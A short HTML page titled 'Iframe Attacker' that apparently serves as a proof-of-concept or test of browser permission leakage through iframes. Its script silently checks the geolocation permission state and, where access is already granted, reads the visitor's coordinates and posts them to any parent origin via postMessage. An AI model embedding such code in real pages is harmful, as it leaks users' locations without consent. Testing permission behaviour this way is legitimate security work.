<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Iframe Attacker</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
<script>
const send = msg => parent.postMessage(msg, '*');

// Cek permission TANPA memicu dialog
if (navigator.permissions) {
  navigator.permissions.query({ name: 'geolocation' })
    .then(p => {
      send('permission state: ' + p.state);

      // HANYA baca jika sudah granted
      if (p.state === 'granted') {
        navigator.geolocation.getCurrentPosition(
          pos => {
            send(
              'LOCATION ' +
              pos.coords.latitude + ', ' +
              pos.coords.longitude
            );
          },
          err => {
            send('read error: ' + err.message);
          }
        );
      }
    });
} else {
  send('Permissions API not available');
}
</script>
</body>
</html>
